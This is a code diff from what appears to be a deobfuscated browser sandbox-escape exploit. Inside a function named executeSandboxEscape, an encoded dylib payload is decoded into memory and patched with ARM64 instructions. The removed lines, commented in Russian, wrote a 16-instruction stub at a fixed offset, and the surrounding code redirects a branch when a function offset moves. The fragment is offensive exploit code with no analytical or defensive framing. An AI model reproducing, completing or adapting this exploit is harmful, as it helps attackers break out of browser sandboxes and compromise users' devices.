@@ -1418,22 +1418,6 @@ async function executeSandboxEscape() {/* Original: yA → executeSandboxEscape 
         dylibSize = 2 * dylibBufferEncoded.length;
         const dylibBuffer = window.PhZuiP = new Uint32Array(new ArrayBuffer(dylibSize));
         for (let i = 0; i < dylibSize; i += 4) dylibBuffer[i / 4] = utilityModule.readU16FromString(dylibBufferEncoded, i) >>> 0;
-        // ── WHS v7: pass-through стаб напрямую в dylibBuffer @0x68d8 ──
-        // Их trampoline вызывает 0x68d8 — кладём туда наш стаб (reg-save → ret 0),
-        // LZW-образ и SA-разметка не тронуты. Стаб = 16 инструкций ARM64.
-        try {
-            const _whsStab = [
-                0xFD7B8FA9, 0xF373BFA9, 0xE96BBFA9, 0xD163BFA9, 0xB35BBFA9, 0x9353BFA9, 0x7149BFA9,
-                0xD2800000,
-                0xF353C1A8, 0xB35BC1A8, 0xD163C1A8, 0xE96BC1A8, 0xF373C1A8, 0x7D84C1A8, 0xFD7BC1A8,
-                0xD65F03C0
-            ];
-            const _stabOff = 0x68d8;
-            for (let _wi = 0; _wi < _whsStab.length; _wi++) {
-                dylibBuffer[(_stabOff >> 2) + _wi] = _whsStab[_wi] >>> 0;
-            }
-            window.log("[WHS] Stub written to dylibBuffer @0x68d8 (16 instr, pass-through)");
-        } catch (_we) { window.log("[WHS] stub write err: " + _we); }
         // ── PATCH: If _process moved, write a B redirect at the hardcoded offset ──
         if (_processOff !== _ORIG_PROCESS_OFF) {
             const _branchDist = (_processOff - _ORIG_PROCESS_OFF) >> 2;
